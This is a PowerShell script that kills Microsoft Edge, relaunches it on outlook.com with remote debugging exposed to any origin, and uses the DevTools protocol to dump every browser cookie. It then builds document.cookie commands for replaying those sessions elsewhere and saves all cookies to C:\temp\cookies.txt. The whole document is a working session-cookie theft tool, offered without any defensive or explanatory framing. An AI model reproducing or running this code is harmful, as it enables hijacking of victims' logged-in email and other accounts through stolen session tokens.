Get-Process msedge | Stop-Process
Start-Process "msedge.exe" "https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session"

Start-Sleep 10

$jsonResponse = Invoke-WebRequest 'http://localhost:9222/json' -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()

$GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()

$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)

$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()

try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
    # $cookies
} catch {
    Write-Host "Error parsing JSON data."
}

$cookieName = "*"  
$specificCookies = $cookies | Where-Object { $_.name -like $cookieName }

$cookieCommands = @()  
foreach ($cookie in $specificCookies) {
    $escapedValue = $cookie.value -replace "'", "\'"
    $escapedPath = $cookie.path -replace "'", "\'"
    $escapedDomain = $cookie.domain -replace "'", "\'"

    $cookieCommand = "document.cookie='" + $cookie.name + "=" + $escapedValue +
                     "; Path=" + $escapedPath + "; Domain=" + $escapedDomain + ";secure';"
    $cookieCommands += $cookieCommand
}

# Join all commands into one long string to be executed in a browser console
#$allCookieCommands = $cookieCommands -join " "
#Write-Host $allCookieCommands
#Set-Clipboard -Value $allCookieCommands
$cookies | ConvertTo-Json | Out-File C:\temp\cookies.txt